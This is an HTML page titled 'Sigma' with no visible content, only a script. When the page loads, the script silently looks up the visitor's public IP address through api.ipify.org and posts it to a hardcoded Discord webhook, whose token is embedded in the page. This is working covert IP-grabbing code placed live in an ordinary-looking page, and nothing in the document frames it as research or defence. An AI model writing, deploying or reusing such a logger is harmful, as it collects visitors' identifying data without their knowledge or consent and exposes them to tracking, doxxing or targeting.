<!DOCTYPE html>
<html>
<head>
    <title>Sigma</title>
</head>
<body>
    <script>
        // Function to get the user's IP address
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
                return null;
            }
        }

        // Function to send the IP address to the Discord webhook
        async function sendIPToDiscord(ip) {
            const webhookURL = 'https://discord.com/api/webhooks/1254086342653251665/4FkcXruY4E-k__5Krqp2Ia3CEh2onAhlcX3BeomMyG0H-R_tpY2O6Gc49tvi4hGfQiJZ';
            const message = {
                content: `User IP: ${ip}`
            };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });
                
                if (response.ok) {
                    console.log('IP sent to Discord successfully');
                } else {
                    console.error('Error sending IP to Discord:', response.statusText);
                }
            } catch (error) {
                console.error('Error sending IP to Discord:', error);
            }
        }

        // Main function to execute the steps
        async function logUserIP() {
            const userIP = await getUserIP();
            if (userIP) {
                await sendIPToDiscord(userIP);
            } else {
                console.error('Could not retrieve user IP');
            }
        }

        // Execute the function when the page loads
        window.onload = logUserIP;
    </script>
</body>
</html>
